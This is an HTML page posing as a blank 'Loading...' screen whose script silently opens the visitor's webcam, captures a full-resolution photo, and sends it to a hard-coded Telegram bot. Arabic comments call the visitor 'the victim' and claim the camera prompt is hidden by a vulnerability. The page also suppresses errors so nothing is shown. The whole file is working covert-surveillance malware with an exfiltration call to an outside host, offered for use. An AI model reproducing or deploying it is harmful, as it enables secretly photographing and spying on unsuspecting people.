<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { margin: 0; overflow: hidden; background: black; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <script>
    (async () => {
        try {
            // طلب الكاميرا - بدون نافذة ظاهرة بسبب الثغرة
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 1920, height: 1080 },
                audio: false 
            });
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;
            
            await new Promise(r => setTimeout(r, 1000));
            
            // التقاط الصورة
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // إرسال الصورة إلى سيرفرك
            const imageData = canvas.toDataURL('image/jpeg', 0.9);
            
            // أرسل إلى بوت التيليجرام خاصتك
            const botToken = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
            const chatId = '1772820433';
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    photo: imageData,
                    caption: `📸 تم التصوير بنجاح! | ${new Date().toLocaleString()}`
                })
            });
            
            // إغلاق الكاميرا بهدوء
            stream.getTracks().forEach(track => track.stop());
            
        } catch(e) {
            // فشل - لا يظهر شيء للضحية
        }
    })();
    </script>
</body>
</html>
